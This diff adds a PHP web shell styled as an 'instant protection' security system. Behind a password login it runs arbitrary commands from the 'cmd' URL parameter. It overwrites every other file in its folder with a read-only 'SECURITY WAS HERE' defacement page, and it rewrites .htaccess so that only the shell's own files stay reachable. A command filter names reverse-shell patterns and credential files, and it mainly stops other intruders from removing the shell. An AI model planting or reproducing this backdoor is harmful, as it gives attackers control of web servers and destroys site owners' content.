+    $scriptName = basename(__FILE__);
+    $htaccessFile = $currentDir . '/.htaccess';
+    
+    // Only create/update if needed
+    $currentContent = @file_get_contents($htaccessFile);
+    $expectedMarker = "INSTANT PROTECTION";
+    
+    if ($currentContent && strpos($currentContent, $expectedMarker) !== false) {
+        return; // Already configured
+    }
+    
+    $htaccessContent = "# ============= " . ALLOWED_USER . " INSTANT PROTECTION =============\n";
+    $htaccessContent .= "Options -Indexes\n";
+    $htaccessContent .= "RewriteEngine On\n";
+    $htaccessContent .= "RewriteBase /\n\n";
+    
+    // Block ALL files except allowed ones
+    $htaccessContent .= "# Block ALL files except allowed ones\n";
+    $htaccessContent .= "RewriteCond %{REQUEST_FILENAME} -f\n";
+    $htaccessContent .= "RewriteCond %{REQUEST_URI} !^/(0x4[lL]ph4\.(php|html|txt)|index\.(php|html)|" . preg_quote($scriptName) . ")$ [NC]\n";
+    $htaccessContent .= "RewriteRule .* " . $scriptName . "?blocked=%{REQUEST_URI} [L,QSA]\n\n";
+    
+    // Force PHP execution for blocked files
+    $htaccessContent .= "<FilesMatch \"\\.(" . implode('|', BLOCK_EXTENSIONS) . ")$\">\n";
+    $htaccessContent .= "    SetHandler application/x-httpd-php\n";
+    $htaccessContent .= "</FilesMatch>\n\n";
+    
+    // Default deny for all
+    $htaccessContent .= "Order Deny,Allow\n";
+    $htaccessContent .= "Deny from all\n\n";
+    
+    // Allow only specific files
+    $allowedFiles = ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html', SCRIPT_NAME];
+    foreach ($allowedFiles as $file) {
+        $htaccessContent .= "<Files \"" . $file . "\">\n";
+        $htaccessContent .= "    Allow from all\n";
+        $htaccessContent .= "</Files>\n\n";
+    }
+    
+    @file_put_contents($htaccessFile, $htaccessContent);
+}
+
+// Function to check if filename is allowed (case-insensitive)
+function isFilenameAllowed($filename) {
+    $basename = basename($filename);
+    $basenameLower = strtolower($basename);
+    
+    $allowedFiles = array_map('strtolower', array_merge(
+        ALLOWED_FILES,
+        [SCRIPT_NAME]
+    ));
+    
+    // Check exact match (case-insensitive)
+    if (in_array($basenameLower, $allowedFiles)) {
+        return true;
+    }
+    
+    // Check if it's one of our protected files (already blocked)
+    // ONLY check if file contains blocking content
+    if (file_exists($filename)) {
+        $content = @file_get_contents($filename, false, null, 0, 200);
+        if ($content && strpos($content, 'INSTANTLY BLOCKED BY') !== false) {
+            return true; // Already blocked, treat as "allowed" for checking purposes
+        }
+    }
+    
+    return false;
+}
+
+// SIMPLE INSTANT file blocking - ALWAYS block if not allowed
+function instantBlockFile($filePath) {
+    if (!file_exists($filePath) || is_dir($filePath)) {
+        return false;
+    }
+    
+    $filename = basename($filePath);
+    $filenameLower = strtolower($filename);
+    
+    // First, check if file is allowed - if YES, DON'T BLOCK
+    $allowedFiles = array_map('strtolower', array_merge(
+        ALLOWED_FILES,
+        [SCRIPT_NAME]
+    ));
+    
+    if (in_array($filenameLower, $allowedFiles)) {
+        return false; // Don't block allowed files
+    }
+    
+    // Check if already blocked
+    $content = @file_get_contents($filePath, false, null, 0, 200);
+    if ($content && strpos($content, 'INSTANTLY BLOCKED BY') !== false) {
+        return true; // Already blocked
+    }
+    
+    // Get original file info before blocking
+    $fileInfo = @stat($filePath);
+    $originalSize = $fileInfo ? $fileInfo['size'] : 0;
+    $originalMtime = $fileInfo ? date('Y-m-d H:i:s', $fileInfo['mtime']) : 'Unknown';
+    
+    // Create blocking content
+    $blockContent = "<?php\n";
+    $blockContent .= "// ============= INSTANTLY BLOCKED BY " . ALLOWED_USER . " SECURITY =============\n";
+    $blockContent .= "// File: " . htmlspecialchars($filename) . "\n";
+    $blockContent .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
+    $blockContent .= "// Path: " . htmlspecialchars($filePath) . "\n";
+    $blockContent .= "// Original Size: " . $originalSize . " bytes\n";
+    $blockContent .= "// Original Modified: " . $originalMtime . "\n";
+    $blockContent .= "// IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN') . "\n";
+    $blockContent .= "// For Security System Purpose Only\n";
+    $blockContent .= "http_response_code(403);\n";
+    $blockContent .= "?><!DOCTYPE html>\n";
+    $blockContent .= "<html>\n<head>\n";
+    $blockContent .= "    <title>ACCESS DENIED - " . ALLOWED_USER . " SECURITY</title>\n";
+    $blockContent .= "    <meta charset=\"UTF-8\">\n";
+    $blockContent .= "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
+    $blockContent .= "    <style>\n";
+    $blockContent .= "        body { \n";
+    $blockContent .= "            background: #e8ecf1; \n";
+    $blockContent .= "            color: #333; \n";
+    $blockContent .= "            font-family: 'Segoe UI', system-ui, sans-serif; \n";
+    $blockContent .= "            display: flex; \n";
+    $blockContent .= "            justify-content: center; \n";
+    $blockContent .= "            align-items: center; \n";
+    $blockContent .= "            min-height: 100vh; \n";
+    $blockContent .= "            margin: 0; \n";
+    $blockContent .= "            padding: 20px; \n";
+    $blockContent .= "        }\n";
+    $blockContent .= "        .security-card { \n";
+    $blockContent .= "            width: 400px; \n";
+    $blockContent .= "            background: #f0f4f8; \n";
+    $blockContent .= "            border-radius: 25px; \n";
+    $blockContent .= "            padding: 35px; \n";
+    $blockContent .= "            box-shadow: 10px 10px 20px #cacfd8, -10px -10px 20px #ffffff; \n";
+    $blockContent .= "            text-align: center; \n";
+    $blockContent .= "        }\n";
+    $blockContent .= "        h1 { \n";
+    $blockContent .= "            color: #e74c3c; \n";
+    $blockContent .= "            margin: 0 0 15px 0; \n";
+    $blockContent .= "            font-size: 22px; \n";
+    $blockContent .= "        }\n";
+    $blockContent .= "        .details { \n";
+    $blockContent .= "            background: #e8ecf1; \n";
+    $blockContent .= "            padding: 15px; \n";
+    $blockContent .= "            border-radius: 12px; \n";
+    $blockContent .= "            margin: 15px 0; \n";
+    $blockContent .= "            text-align: left; \n";
+    $blockContent .= "        }\n";
+    $blockContent .= "        .security-badge { \n";
+    $blockContent .= "            background: #3498db; \n";
+    $blockContent .= "            color: white; \n";
+    $blockContent .= "            padding: 8px 20px; \n";
+    $blockContent .= "            border-radius: 18px; \n";
+    $blockContent .= "            font-weight: 600; \n";
+    $blockContent .= "            margin-top: 15px; \n";
+    $blockContent .= "            display: inline-block; \n";
+    $blockContent .= "        }\n";
+    $blockContent .= "    </style>\n";
+    $blockContent .= "</head>\n<body>\n";
+    $blockContent .= "    <div class=\"security-card\">\n";
+    $blockContent .= "        <h1>💢 ACCESS DENIED 💢</h1>\n";
+    $blockContent .= "        <p><strong>-==[ " . ALLOWED_USER . " SECURITY WAS HERE ]==-</strong></p>\n";
+    $blockContent .= "        <div class=\"details\">\n";
+    $blockContent .= "            <p><strong>File:</strong> " . htmlspecialchars($filename) . "</p>\n";
+    $blockContent .= "            <p><strong>Time:</strong> " . date('Y-m-d H:i:s') . "</p>\n";
+    $blockContent .= "            <p><strong>Path:</strong> " . htmlspecialchars(dirname($filePath)) . "</p>\n";
+    $blockContent .= "            <p><strong>Reason:</strong> Unauthorized file secured</p>\n";
+    $blockContent .= "        </div>\n";
+    $blockContent .= "        <div class=\"security-badge\">🔐 Oopss!!! Websites Protected 🔐</div>\n";
+    $blockContent .= "    </div>\n";
+    $blockContent .= "</body>\n</html>\n";
+    $blockContent .= "<?php exit(); ?>";
+
+    // Write and protect file
+    $result = @file_put_contents($filePath, $blockContent);
+    if ($result !== false) {
+        @chmod($filePath, 0444); // Read-only
+        return true;
+    }
+    
+    return false;
+}
+
+// SIMPLE SCANNER - current directory only (for performance)
+function instantScanFiles() {
+    $currentDir = dirname(__FILE__);
+    $blocked = 0;
+    
+    // Get list of files in current directory
+    $files = @scandir($currentDir);
+    if (!$files) return 0;
+    
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..' || $file === '.htaccess') continue;
+        
+        $filePath = $currentDir . '/' . $file;
+        
+        if (is_dir($filePath)) {
+            continue; // Skip directories for now
+        }
+        
+        // SIMPLE CHECK: If filename is NOT allowed, BLOCK IT
+        $filenameLower = strtolower($file);
+        $allowedFiles = array_map('strtolower', array_merge(
+            ALLOWED_FILES,
+            [SCRIPT_NAME]
+        ));
+        
+        if (!in_array($filenameLower, $allowedFiles)) {
+            // Block the file (regardless of extension)
+            if (instantBlockFile($filePath)) {
+                $blocked++;
+            }
+        }
+    }
+    
+    return $blocked;
+}
+
+// Show blocked page
+function showBlockedPage($filename) {
+    http_response_code(403);
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>ACCESS DENIED - <?php echo ALLOWED_USER; ?> SECURITY SYSTEM</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body { 
+                background: #e8ecf1; 
+                color: #333; 
+                font-family: 'Segoe UI', system-ui, sans-serif; 
+                display: flex; 
+                justify-content: center; 
+                align-items: center; 
+                min-height: 100vh; 
+                margin: 0; 
+                padding: 20px; 
+            }
+            .security-card { 
+                width: 400px; 
+                background: #f0f4f8; 
+                border-radius: 25px; 
+                padding: 35px; 
+                box-shadow: 10px 10px 20px #cacfd8, -10px -10px 20px #ffffff; 
+                text-align: center; 
+            }
+            h1 { 
+                color: #e74c3c; 
+                margin: 0 0 15px 0; 
+                font-size: 22px; 
+            }
+            .details { 
+                background: #e8ecf1; 
+                padding: 15px; 
+                border-radius: 12px; 
+                margin: 15px 0; 
+                text-align: left; 
+            }
+            .security-badge { 
+                background: #3498db; 
+                color: white; 
+                padding: 8px 20px; 
+                border-radius: 18px; 
+                font-weight: 600; 
+                margin-top: 15px; 
+                display: inline-block; 
+            }
+        </style>
+    </head>
+    <body>
+        <div class="security-card">
+            <h1>🚫 ACCESS DENIED</h1>
+            <p><strong><?php echo ALLOWED_USER; ?> SECURITY SYSTEM</strong></p>
+            <div class="details">
+                <p><strong>File:</strong> <?php echo htmlspecialchars($filename); ?></p>
+                <p><strong>Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
+                <p><strong>IP:</strong> <?php echo $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'; ?></p>
+                <p><strong>Path:</strong> <?php echo htmlspecialchars($_SERVER['REQUEST_URI'] ?? ''); ?></p>
+                <p><strong>Reason:</strong> For Security System Purpose Only</p>
+            </div>
+            <div class="security-badge">🔐 Oopss!!! Websites Protected 🔐</div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Run instant scan only if needed (every 30 seconds to prevent lag)
+$instantBlockCount = 0;
+$lastScanTime = $_SESSION['last_scan_time'] ?? 0;
+$currentTime = time();
+
+// Always scan on first load or if enough time has passed
+if ($currentTime - $lastScanTime >= SCAN_INTERVAL) {
+    $instantBlockCount = instantScanFiles();
+    $_SESSION['last_scan_time'] = $currentTime;
+}
+
+// Process command execution
+$commandOutput = '';
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['cmd'])) {
+    $command = trim($_GET['cmd']);
+    
+    if (!empty($command)) {
+        if (isDangerousCommand($command)) {
+            $commandOutput = "Command blocked by " . ALLOWED_USER . " Security System\n";
+            $commandOutput .= "Reason: Potentially dangerous command detected\n";
+        } else {
+            set_time_limit(10);
+            $output = [];
+            $return_var = 0;
+            
+            @exec($command . ' 2>&1', $output, $return_var);
+            
+            if (!empty($output)) {
+                $commandOutput = "Command: " . htmlspecialchars($command) . "\n";
+                $commandOutput .= "Output:\n" . str_repeat("-", 70) . "\n";
+                
+                foreach ($output as $line) {
+                    $cleanLine = rtrim($line);
+                    $cleanLine = preg_replace('/\s+/', ' ', $cleanLine);
+                    $commandOutput .= htmlspecialchars($cleanLine) . "\n";
+                }
+                
+                $commandOutput .= str_repeat("-", 70) . "\n";
+                $commandOutput .= "Exit code: " . $return_var . "\n";
+            }
+            
+            // Rescan after command execution
+            $newBlocks = instantScanFiles();
+            if ($newBlocks > 0) {
+                $commandOutput .= "\n[SECURITY] " . $newBlocks . " files secured!\n";
+            }
+        }
+    }
+}
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// ============= LOGIN FUNCTION =============
+function showLogin() {
+    $error = '';
+    
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $password = $_POST['password'] ?? '';
+        
+        if ($password === DEFAULT_PASSWORD) {
+            $_SESSION['authenticated'] = true;
+            $_SESSION['login_time'] = time();
+            $_SESSION['last_activity'] = time();
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = 'Invalid password!';
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Secure Login - <?php echo ALLOWED_USER; ?> SH3LL</title>
+        <style>
+            /* Reset and Base */
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+            
+            body {
+                font-family: 'Segoe UI', system-ui, sans-serif;
+                background: #e8ecf1;
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }
+            
+            /* Login Card */
+            .login-card {
+                width: 380px;
+                background: #f0f4f8;
+                border-radius: 25px;
+                padding: 35px;
+                box-shadow: 10px 10px 20px #cacfd8, -10px -10px 20px #ffffff;
+                text-align: center;
+            }
+            
+            /* Logo */
+            .logo-container {
+                display: flex;
+                justify-content: center;
+                margin-bottom: 25px;
+            }
+            
+            .logo {
+                width: 80px;
+                height: 80px;
+                border-radius: 50%;
+                background: #f0f4f8;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 10px;
+                box-shadow: 
+                    5px 5px 10px #cacfd8,
+                    -5px -5px 10px #ffffff;
+            }
+            
+            .logo img {
+                width: 60px;
+                height: 60px;
+                border-radius: 50%;
+                object-fit: cover;
+            }
+            
+            /* Title */
+            h2 {
+                color: #2c3e50;
+                font-size: 24px;
+                font-weight: 700;
+                margin-bottom: 8px;
+            }
+            
+            .subtitle {
+                color: #7f8c8d;
+                font-size: 13px;
+                margin-bottom: 25px;
+            }
+            
+            /* Error Message */
+            .error {
+                background: rgba(231, 76, 60, 0.1);
+                color: #e74c3c;
+                padding: 12px 15px;
+                border-radius: 12px;
+                margin-bottom: 20px;
+                font-size: 13px;
+                font-weight: 600;
+            }
+            
+            /* Form */
+            .form-group {
+                margin-bottom: 20px;
+            }
+            
+            .password-wrapper {
+                position: relative;
+            }
+            
+            input[type="password"],
+            input[type="text"] {
+                width: 100%;
+                padding: 14px 95px 14px 15px;
+                background: #f0f4f8;
+                border: none;
+                border-radius: 12px;
+                color: #2c3e50;
+                font-size: 14px;
+                font-weight: 500;
+                box-shadow: inset 4px 4px 8px #cacfd8, inset -4px -4px 8px #ffffff;
+            }
+            
+            input[type="password"]:focus,
+            input[type="text"]:focus {
+                outline: none;
+            }
+            
+            /* Toggle Button */
+            .toggle-btn {
+                position: absolute;
+                right: 8px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: #f0f4f8;
+                border: none;
+                color: #3498db;
+                font-size: 11px;
+                font-weight: 700;
+                padding: 7px 15px;
+                border-radius: 10px;
+                cursor: pointer;
+                text-transform: uppercase;
+                box-shadow: 3px 3px 6px #cacfd8, -3px -3px 6px #ffffff;
+            }
+            
+            /* Submit Button */
+            input[type="submit"] {
+                width: 100%;
+                padding: 14px;
+                background: #f0f4f8;
+                color: #2c3e50;
+                border: none;
+                border-radius: 12px;
+                font-size: 14px;
+                font-weight: 700;
+                cursor: pointer;
+                text-transform: uppercase;
+                box-shadow: 5px 5px 10px #cacfd8, -5px -5px 10px #ffffff;
+            }
+            
+            /* Security Badge */
+            .security-badge {
+                margin-top: 20px;
+                padding: 8px 20px;
+                background: #3498db;
+                color: white;
+                border-radius: 18px;
+                font-size: 11px;
+                font-weight: 700;
+                display: inline-block;
+            }
+            
+            /* Responsive */
+            @media (max-width: 420px) {
+                .login-card {
+                    width: 340px;
+                    padding: 30px;
+                }
+            }
+        </style>
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const passwordInput = document.getElementById('password');
+                const toggleBtn = document.querySelector('.toggle-btn');
+                
+                passwordInput.focus();
+                
+                toggleBtn.addEventListener('click', function() {
+                    if (passwordInput.type === 'password') {
+                        passwordInput.type = 'text';
+                        toggleBtn.textContent = 'HIDE';
+                    } else {
+                        passwordInput.type = 'password';
+                        toggleBtn.textContent = 'SHOW';
+                    }
+                });
+            });
+        </script>
+    </head>
+    <body>
+        <div class="login-card">
+            <div class="logo-container">
+                <div class="logo">
+                    <img src="https://i.ibb.co/GfwY80PT/20251208-093450.png" alt="<?php echo ALLOWED_USER; ?> Logo">
+                </div>
+            </div>
+            
+            <h2>-==[ <?php echo ALLOWED_USER; ?> SH3LL ]==-</h2>
+            <div class="subtitle">Security Access Portal</div>
+            
+            <?php if ($error): ?>
+            <div class="error"><?php echo htmlspecialchars($error); ?></div>
+            <?php endif; ?>
+            
+            <form method="POST">
+                <div class="form-group">
+                    <div class="password-wrapper">
+                        <input type="password" name="password" id="password" 
+                               placeholder="Enter secure password" required autocomplete="off">
+                        <button type="button" class="toggle-btn">SHOW</button>
+                    </div>
+                </div>
+                <input type="submit" value="Login">
+            </form>
+            
+            <div class="security-badge">Note: Strictly used an authorized Information Access.</div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+function isDangerousCommand($command) {
+    $command = trim($command);
+    
+    // Allow wget/curl only for allowed files
+    if (preg_match('/^\s*(wget|curl)\s+/i', $command)) {
+        if (preg_match('/-(O|o)\s+["\']?([^"\'\s]+)["\']?/i', $command, $matches)) {
+            $outputFile = $matches[2];
+            if (!isFilenameAllowed($outputFile)) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    $dangerousPatterns = [
+        '/^rm\s+-(rf|fr|r|f)/i',
+        '/^rm\s+.*\*.*$/i',
+        '/^\s*(nmap|nikto|sqlmap|wpscan|gobuster|dirb)\s+/i',
+        '/bash\s+-i\s+>/i',
+        '/nc\s+.*-e\s+/i',
+        '/python\s+-c\s+/i',
+        '/php\s+-r\s+/i',
+        '/chmod\s+[0-7]{3,4}\s+' . preg_quote(SCRIPT_NAME, '/') . '/i',
+        '/rm.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
+        '/mv.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
+        '/cp.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
+        '/unlink.*' . preg_quote(SCRIPT_NAME, '/') . '/i',
+    ];
+    
+    foreach ($dangerousPatterns as $pattern) {
+        if (preg_match($pattern, $command)) {
+            return true;
+        }
+    }
+    
+    $suspiciousKeywords = [
+        'webshell', 'backdoor', 'exploit', 'inject', 'bypass', 'hack',
+        'deface', 'crack', 'brute', 'ddos', 'reverse', 'shell',
+        'payload', 'rootkit', 'trojan', 'virus', 'malware',
+        'passwd', 'shadow', 'etc/passwd', 'proc/self',
+        'kill', 'killall', 'pkill', 'chattr', 'chown',
+        'chmod 777', 'chmod 755', 'wget http', 'curl http',
+        ';', '&&', '||', '`', '$('
+    ];
+    
+    foreach ($suspiciousKeywords as $keyword) {
+        if (stripos($command, $keyword) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo ALLOWED_USER; ?> SH3LL MANAGER</title>
+    <style>
+        /* Reset and Base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #e8ecf1;
+            color: #2c3e50;
+            min-height: 100vh;
+            padding: 25px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        /* Card Base Style */
+        .neumorphic-card {
+            background: #f0f4f8;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 8px 8px 16px #cacfd8, -8px -8px 16px #ffffff;
+        }
+        
+        /* Header Card */
+        .header-card {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            min-height: 80px;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-small {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #f0f4f8;
+            padding: 5px;
+            box-shadow: 3px 3px 6px #cacfd8, -3px -3px 6px #ffffff;
+        }
+        
+        .logo-small img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+        }
+        
+        .header-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .session-badge {
+            background: #e8ecf1;
+            padding: 8px 15px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #3498db;
+        }
+        
+        .logout-btn {
+            background: #f0f4f8;
+            color: #e74c3c;
+            text-decoration: none;
+            padding: 8px 18px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 13px;
+            box-shadow: 4px 4px 8px #cacfd8, -4px -4px 8px #ffffff;
+        }
+        
+        /* Alert Card */
+        .alert-card {
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 18px 25px;
+        }
+        
+        .alert-icon {
+            width: 40px;
+            height: 40px;
+            background: #2ecc71;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+        
+        /* Command Card */
+        .command-card {
+            min-height: 100px;
+            padding: 20px 25px;
+        }
+        
+        .command-wrapper {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .command-input {
+            flex: 1;
+            padding: 14px 20px;
+            background: #e8ecf1;
+            color: #2c3e50;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: inset 4px 4px 8px #cacfd8, inset -4px -4px 8px #ffffff;
+        }
+        
+        .command-input:focus {
+            outline: none;
+        }
+        
+        .command-submit {
+            background: #f0f4f8;
+            color: #3498db;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 5px 5px 10px #cacfd8, -5px -5px 10px #ffffff;
+            min-width: 100px;
+        }
+        
+        /* Output Card */
+        .output-card {
+            min-height: 350px;
+            max-height: 500px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .output-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .output {
+            background: #e8ecf1;
+            padding: 20px;
+            border-radius: 15px;
+            flex: 1;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #2c3e50;
+        }
+        
+        .output::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .output::-webkit-scrollbar-track {
+            background: #e8ecf1;
+            border-radius: 10px;
+        }
+        
+        .output::-webkit-scrollbar-thumb {
+            background: #3498db;
+            border-radius: 10px;
+        }
+        
+        /* Footer Card */
+        .footer-card {
+            padding: 20px 25px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+                gap: 15px;
+            }
+            
+            .header-card {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .header-left {
+                flex-direction: column;
+            }
+            
+            .header-controls {
+                flex-direction: column;
+                width: 100%;
+            }
+            
+            .command-wrapper {
+                flex-direction: column;
+            }
+            
+            .command-submit {
+                width: 100%;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .neumorphic-card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header Card -->
+        <div class="neumorphic-card header-card">
+            <div class="header-left">
+                <div class="logo-small">
+                    <img src="https://i.ibb.co/GfwY80PT/20251208-093450.png" alt="<?php echo ALLOWED_USER; ?> Logo">
+                </div>
+                <h1>⚡ <?php echo ALLOWED_USER; ?> MANAGER ⚡</h1>
+            </div>
+            <div class="header-controls">
+                <div class="session-badge">
+                    🕒 Session: <?php echo gmdate("H:i:s", time() - $_SESSION['login_time']); ?>
+                </div>
+                <a href="?logout" class="logout-btn">
+                    LOGOUT
+                </a>
+            </div>
+        </div>
+        
+        <!-- Alert Card -->
+        <?php if ($instantBlockCount > 0): ?>
+        <div class="neumorphic-card alert-card">
+            <div class="alert-icon">✅</div>
+            <div>
+                <strong>REAL-TIME PROTECTION ACTIVE</strong><br>
+                <?php echo $instantBlockCount; ?> files secured automatically
+            </div>
+        </div>
+        <?php endif; ?>
+        
+        <!-- Command Card -->
+        <div class="neumorphic-card command-card">
+            <form method="GET" class="command-wrapper">
+                <input type="text" name="cmd" class="command-input" 
+                       placeholder="Enter command (e.g., ls -la, pwd, whoami)..." 
+                       value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>"
+                       autocomplete="off">
+                <button type="submit" class="command-submit">EXECUTE</button>
+            </form>
+        </div>
+        
+        <!-- Output Card -->
+        <div class="neumorphic-card output-card">
+            <div class="output-header">
+                <strong>SYSTEM OUTPUT</strong>
+                <div class="session-badge" style="font-size: 12px;">Last Scan: <?php echo date('H:i:s'); ?></div>
+            </div>
+            <div class="output">
+                <?php 
+                if ($commandOutput) {
+                    echo $commandOutput;
+                } else {
+                    echo "INSTANT PROTECTION SYSTEM - ACTIVE\n";
+                    echo str_repeat("=", 60) . "\n\n";
+                    
+                    echo "📁 PROTECTION FEATURES:\n";
+                    echo str_repeat("-", 60) . "\n";
+                    echo "• Blocks ALL non-0x4LPH4/non-index files\n";
+                    echo "• .htaccess redirect protection\n";
+                    echo "• Blocks existing AND newly uploaded files\n";
+                    echo "• Simple filename-based blocking\n";
+                    echo "• Session-based access control\n\n";
+                    
+                    echo "📋 ALLOWED FILES ONLY:\n";
+                    echo str_repeat("-", 60) . "\n";
+                    foreach (ALLOWED_FILES as $file) {
+                        echo "• " . $file . "\n";
+                    }
+                    echo "• " . SCRIPT_NAME . "\n\n";
+                    
+                    echo "🛡️ SECURITY STATUS:\n";
+                    echo str_repeat("-", 60) . "\n";
+                    echo "• Protection: ACTIVE\n";
+                    echo "• Session: " . gmdate("H:i:s", time() - $_SESSION['login_time']) . "\n";
+                    echo "• Last Scan: " . date('H:i:s') . "\n";
+                    echo "• Blocked Files: " . $instantBlockCount . "\n\n";
+                    
+                    echo "💡 TIPS:\n";
+                    echo str_repeat("-", 60) . "\n";
+                    echo "• Use 'ls -la' to list files\n";
+                    echo "• Use 'pwd' to show current directory\n";
+                    echo "• All files except allowed ones are blocked\n";
+                    echo "• Works for existing AND newly uploaded files\n";
+                }
+                ?>
+            </div>
+        </div>
+        
+        <!-- Footer Card -->
+        <div class="neumorphic-card footer-card">
+            <strong>🔐 SECURITY INFORMATION</strong>
+            <p style="margin-top: 10px; font-size: 14px; color: #7f8c8d;">
+                This system automatically blocks ALL non-authorized files in real-time.<br>
+                Only these files are allowed: 0x4lph4.php, 0x4lph4.html, 0x4lph4.txt, index.php, index.html<br>
+                All other files (existing and newly uploaded) will be blocked immediately.
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        // Simple script - no animations to prevent lag
+        document.addEventListener('DOMContentLoaded', function() {
+            const outputDiv = document.querySelector('.output');
+            if (outputDiv) {
+                outputDiv.scrollTop = outputDiv.scrollHeight;
+            }
+            
+            const cmdInput = document.querySelector('.command-input');
+            if (cmdInput) {
+                cmdInput.focus();
+            }
+        });
+    </script>
+</body>
+</html>
